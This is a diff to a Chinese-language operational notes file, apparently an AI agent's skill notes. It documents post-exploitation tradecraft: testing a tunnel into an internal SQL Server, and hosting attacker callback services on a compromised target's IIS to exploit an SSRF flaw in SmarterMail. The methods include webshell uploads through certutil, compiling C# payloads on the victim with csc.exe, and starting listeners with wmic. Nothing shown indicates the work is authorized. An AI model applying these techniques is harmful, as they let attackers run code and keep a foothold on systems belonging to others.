@@ -35,6 +35,18 @@ metadata:
 5. **SQL Server 强制 TLS**（impacket 显示 "Encryption required, switching to TLS"）→ 裸 TDS prelogin 测试必然失败/无响应，**不代表隧道坏**；真客户端（Navicat/impacket）的 TLS 握手会穿过透明隧道正常完成
 6. **连通性测试禁用 curl telnet/状态码**（用户铁规则，本会话误判 1433 公网不通）：SQL 等"建连后不发言"的服务让 curl 傻等 banner 到超时 = 假阴性。TCP 连通性一律 Python socket connect；任何 curl 空/超时/异常结果先声明"可能不准"再下结论
 
+## 在目标 IIS 上托管回调/假服务（无新端口，实测 2026-08）
+
+SSRF/回调型漏洞（如 SmarterMail ConnectToHub）需要**目标主动连我们的服务**——监听器放 webshell 主机可能被防火墙/跨段挡。终极解法：**把回调服务挂到目标机现有 IIS 的 80 端口上**（公网/内网全可达，无新端口、无防火墙问题）：
+
+1. **ASPX PathInfo 技巧（核心）**：`/Content/Uploads/hub.aspx/任意/追加/路径` → IIS 仍执行 hub.aspx（追加路径进 PathInfo）！所以回调 URL 直接给 aspx 全路径，对方追加的 API 路径会被当 PathInfo 吃掉。已验证：`hub2.aspx/web/api/node-management/setup-initial-connection` → 200 + JSON
+2. **回调页读静态 JSON 文件返回**：`Response.Write(File.ReadAllText(Server.MapPath(".")+"\\hub_json.txt"))`——JSON 存独立静态文件（certutil 上传），避免 C# 字符串转义地狱（`Response.Write({"raw json"})` 是语法错误 → 页面静默回退旧版）
+3. **ASPX 覆盖不生效坑**：覆盖已有 aspx 后 IIS 可能**继续服务旧编译版**（编译缓存；文件有语法错误时静默回退旧版，无可见报错）→ 改内容用**新文件名**（hub2.aspx）强制重新编译
+4. **IIS 不服务无扩展名静态文件**（Uploads 下 `setup-initial-connection` 返回 404）→ 静态文件假服务方案作废，PathInfo aspx 是正解
+5. **目标机本地编译**：上传 .cs（base64 ≤7.8KB 单条 echo）→ `certutil -decode` → 目标机 `csc.exe /target:exe` → 绕开二进制上传大小限制（cmd 行 8191 上限）
+6. **分离启动进程**：`start "" /b X.exe` 占住 webshell 的 stdout 管道（payload 等 EOF → 请求超时）→ 用 `wmic process call create "path\X.exe 端口"`（可用时；返回 ProcessId，`netstat -an | findstr 端口` 验证监听）
+7. **git-bash heredoc 反斜杠坑**：heredoc 里 `\\` 被折叠成 `\`，Python 源码 `\t` 变 TAB → cmd 路径损坏报 "filename syntax is incorrect"。**带反斜杠路径的脚本一律用 write_file 写文件再跑**（raw string 原样保留），别用 heredoc
+
 ## 验证（隧道健康 = 端到端真实会话，不是 ping）
 - forward 模式 + `impacket mssqlclient "user:pass@127.0.0.1" -port <本地端口>` → 返回 `ERROR(SQLxxxx): Login failed for user 'xxx'` = **端到端通**（登录失败恰恰证明服务器回应了；SQLxxxx 是内网实例名）
 - 或隧道连目标机自己的 localhost HTTP 服务（如 127.0.0.1:25813 Nuxt）→ HTTP 200 = 双向通
